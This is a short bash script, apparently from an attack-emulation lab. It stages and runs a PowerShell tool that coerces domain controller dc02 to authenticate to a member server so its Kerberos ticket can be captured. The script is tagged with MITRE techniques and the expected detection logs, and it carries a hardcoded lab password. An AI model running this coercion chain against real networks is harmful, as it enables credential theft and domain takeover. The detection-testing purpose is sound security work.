#!/usr/bin/env bash
# T102 — Coerce dc02$ to auth to mbr01 + capture TGT
# MITRE: T1187 (Forced Authentication), T1550.002 (Use Alternate Auth Mat: Kerberos), T1570 (Lateral Tool Transfer)
# DFIR: Security 4624/4648, Sysmon 1/11, Zeek smb.log, WinRM 91/93, Suricata SID:1000050
set -euo pipefail
source "$(dirname "$0")/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T102-COERCE-DC02-${CASE_DATE:-$(date -u +%Y%m%d)}-ws01"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
PS1_LOCAL="${CAMPAIGN_A_LIB}/../windows/campaign-a-t102-coerce-dc02.ps1"

echo "=== T102 | ${CASE_ID} | T0=${T0} ==="

bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${PS1_LOCAL}" "campaign-a-t102-coerce-dc02.ps1"
# Ensure the reusable SYSTEM-exec helper is also staged
bash "${CAMPAIGN_A_LIB}/ws01-stage-file.sh" "${CAMPAIGN_A_LIB}/../windows/campaign-a-t043-system-exec.ps1" "campaign-a-t043-system-exec.ps1"

ws01_exec_as analyst_t1 'T13r_An@lyst!' \
  "powershell -NoProfile -ExecutionPolicy Bypass -File C:\\Tools\\cadre-attack\\campaign-a-t102-coerce-dc02.ps1 -Server ${MBR01:-192.168.77.22} -Username analyst_t1 -Password 'T13r_An@lyst!' -ToolSource 'C:\\Tools\\ADTools' -CaptureServer 'mbr01.child.cadre.local' -TargetDC 'dc02.child.cadre.local'"

cadre_export "${CASE_ID}" T102 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T102 complete ==="
